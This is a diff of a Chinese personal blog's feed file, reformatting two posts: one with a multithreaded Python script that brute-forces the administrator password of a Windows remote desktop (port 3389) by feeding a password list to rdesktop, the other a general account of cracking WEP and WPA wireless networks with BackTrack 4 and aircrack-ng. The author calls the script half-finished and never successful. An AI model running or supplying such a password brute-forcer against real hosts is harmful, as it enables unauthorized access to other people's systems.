@@ -12,11 +12,13 @@
 &lt;p&gt;附一个在Linux下破解3389口令的脚本,半成品. 必须要用户自己判断才行.&lt;/p&gt;
 &lt;p&gt;本来网上说的都是rdesktop打上补丁就可以破解了,可是我打上补丁后,运行老是出错.没法,自己写个玩玩,虽然实战中没有成功过,估计以后改进后能用.&lt;/p&gt;
 &lt;p&gt;程序说明:
-1. 使用了多线程.
-2. 调用了rdesktop工具, 所有参数按最节约带宽来写.
-3. 自己制作pass.txt文件.
-4. 成功登录后,rdesktop标题显示为Pass:[the_password]
-5. rdesktop打开的窗口不需要手动关闭,超时后会自动退出.&lt;/p&gt;
+1. 使用了多线程.&lt;/p&gt;
+&lt;ol class="arabic simple"&gt;
+&lt;li&gt;调用了rdesktop工具, 所有参数按最节约带宽来写.&lt;/li&gt;
+&lt;li&gt;自己制作pass.txt文件.&lt;/li&gt;
+&lt;li&gt;成功登录后,rdesktop标题显示为Pass:[the_password]&lt;/li&gt;
+&lt;li&gt;rdesktop打开的窗口不需要手动关闭,超时后会自动退出.&lt;/li&gt;
+&lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
 &lt;span class="c"&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
 
@@ -31,35 +33,35 @@
 &lt;span class="n"&gt;passwords&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;RDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-                &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;
 
-        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-                &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-                        &lt;span class="n"&gt;pwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-                        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Current PASS: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
-                        &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;rdesktop -m -g 480x320 -u administrator -p &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; -k en-us -a 8 -T &amp;#39;Pass:[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;]&amp;#39; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-                        &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-                        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;
-                        &lt;span class="c"&gt;#             if res == 0:&lt;/span&gt;
-                        &lt;span class="c"&gt;#                 sys.exit()&lt;/span&gt;
-                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_done&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;pwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Current PASS: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;rdesktop -m -g 480x320 -u administrator -p &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; -k en-us -a 8 -T &amp;#39;Pass:[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;]&amp;#39; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;
+            &lt;span class="c"&gt;#             if res == 0:&lt;/span&gt;
+            &lt;span class="c"&gt;#                 sys.exit()&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_done&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread_max&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-                &lt;span class="n"&gt;rdp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-                &lt;span class="c"&gt;#        rdp.setDaemon(True)&lt;/span&gt;
-                &lt;span class="n"&gt;rdp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread_max&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;rdp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="c"&gt;#        rdp.setDaemon(True)&lt;/span&gt;
+        &lt;span class="n"&gt;rdp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pwd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pass_file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-                &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pwd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pass_file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pwd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
 
 &lt;span class="c"&gt;#    passwords.join()&lt;/span&gt;
 
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 </summary><category term="wireless"></category><category term="crack"></category></entry><entry><title>wireless cracking</title><link href="http://www.renewjoy.org/wireless_cracking.html" rel="alternate"></link><updated>2010-05-27T21:10:00+02:00</updated><author><name>renewjoy</name></author><id>tag:www.renewjoy.org,2010-05-27:wireless_cracking.html</id><summary type="html">&lt;p&gt;因为接触上bt4后，开始了对wireless cracking有点兴趣了。&lt;/p&gt;
 &lt;p&gt;最近搞了张TP-WN322G+ v1.0 的USB无线网卡（曲折的过程啊，汗）&lt;/p&gt;
@@ -71,18 +73,24 @@ Bus 002 Device 004: ID 0ace:1215 ZyDAS WLA-54L WiFi --&gt;
 &lt;p&gt;测试是在虚拟机里面进行的，用的bt4-bata版本。&lt;/p&gt;
 &lt;p&gt;我不是为了破解无线网络才去研究bt4的，只是因为了解bt4集成了大量（据说&amp;gt;300种）penetration testing tools才去下载的。后来就随便研究了下无线网的破解。&lt;/p&gt;
 &lt;p&gt;无线网络的破解你需要什么呢？
-1. 一张无线网卡，机子集成的或者usb，最重要的是芯片要支持aircrack-ng工具集，然后就是最好能默认支持bt4，支持aircrack-ng和支持bt4是两个概念，前者为能破解，后者为bt4能识别。如果默认驱动不支持，那就看你的Linux水平了，唉，我还不够，所以在网上查了好久才决定去弄tp-wn322g+的型号。
-2. 最好能有一个Linux系统，版本不限，据说在windows下相对要麻烦很多（还没有测试过）。因为aircrack-ng这个要能运行的话，可能你的网卡需要另外的驱动。&lt;/p&gt;
+1. 一张无线网卡，机子集成的或者usb，最重要的是芯片要支持aircrack-ng工具集，然后就是最好能默认支持bt4，支持aircrack-ng和支持bt4是两个概念，前者为能破解，后者为bt4能识别。如果默认驱动不支持，那就看你的Linux水平了，唉，我还不够，所以在网上查了好久才决定去弄tp-wn322g+的型号。&lt;/p&gt;
+&lt;ol class="arabic simple" start="2"&gt;
+&lt;li&gt;最好能有一个Linux系统，版本不限，据说在windows下相对要麻烦很多（还没有测试过）。因为aircrack-ng这个要能运行的话，可能你的网卡需要另外的驱动。&lt;/li&gt;
+&lt;/ol&gt;
 &lt;p&gt;呵呵，很多人都只知道bt4是破解无线网络的，其实要分清楚概念哈：
-1. 破解无线网络不是bt4的专利。
-2. bt4破解无线网络只是因为它集成了aricrack-ng工具集，而且他的强大也不表现在此。因为bt4是为渗透测试和取证专用版本，它集成了大量的工具而已。当然在无线这块，他的优势就是集成了大量的无线网卡驱动。&lt;/p&gt;
+1. 破解无线网络不是bt4的专利。&lt;/p&gt;
+&lt;ol class="arabic simple" start="2"&gt;
+&lt;li&gt;bt4破解无线网络只是因为它集成了aricrack-ng工具集，而且他的强大也不表现在此。因为bt4是为渗透测试和取证专用版本，它集成了大量的工具而已。当然在无线这块，他的优势就是集成了大量的无线网卡驱动。&lt;/li&gt;
+&lt;/ol&gt;
 &lt;p&gt;我目前的总结：
-1. 破解wep的时候的时候，难点在于能否快速抓取大量的包。当包到一定量的时候，破解只是瞬间的事。而如果不采取arpRequest注入的话，可能抓取到能破解包的时间会以天来算。
-2. 破解wpa/wpa2的话，最重要的就是能抓取到4-way handshakes，我测试还没有成功（或许距离太远，或许……原因不明）。而抓取后，能否破解就取决于你字典的大小了。或者你有wpa的rainbow tables，呵呵，网上有33.4G的，我目前无法下载。
-3. 不要相信很多人的文章，第一说不清楚过程，第二讲不明白道理，自己也是道听途说，最重要的文档就是aricrack-ng的官方文档，花点时间看看，很值得。
-4. 其实抓包过程是漫长的，建议好好去官网看看aireplay-ng的9种模式的文档，慢慢研究，这样收获很大。
-5. spoonwep2/spoonwpa只是aricrack-ng工具集的非常丑陋的图形界面，用好aircrack-ng这个命令行工具才最重要。
-6. 想速成”蹭网“的人，建议打消念头哈。&lt;/p&gt;
+1. 破解wep的时候的时候，难点在于能否快速抓取大量的包。当包到一定量的时候，破解只是瞬间的事。而如果不采取arpRequest注入的话，可能抓取到能破解包的时间会以天来算。&lt;/p&gt;
+&lt;ol class="arabic simple" start="2"&gt;
+&lt;li&gt;破解wpa/wpa2的话，最重要的就是能抓取到4-way handshakes，我测试还没有成功（或许距离太远，或许……原因不明）。而抓取后，能否破解就取决于你字典的大小了。或者你有wpa的rainbow tables，呵呵，网上有33.4G的，我目前无法下载。&lt;/li&gt;
+&lt;li&gt;不要相信很多人的文章，第一说不清楚过程，第二讲不明白道理，自己也是道听途说，最重要的文档就是aricrack-ng的官方文档，花点时间看看，很值得。&lt;/li&gt;
+&lt;li&gt;其实抓包过程是漫长的，建议好好去官网看看aireplay-ng的9种模式的文档，慢慢研究，这样收获很大。&lt;/li&gt;
+&lt;li&gt;spoonwep2/spoonwpa只是aricrack-ng工具集的非常丑陋的图形界面，用好aircrack-ng这个命令行工具才最重要。&lt;/li&gt;
+&lt;li&gt;想速成”蹭网“的人，建议打消念头哈。&lt;/li&gt;
+&lt;/ol&gt;
 &lt;p&gt;我的感觉是：
 第0 : 了解无线网络常用术语，配置Linux环境，或许你需要一定时间。&lt;/p&gt;
 &lt;p&gt;第一: 让Linux系统支持识别你的网卡，或许你需要一定时间。&lt;/p&gt;
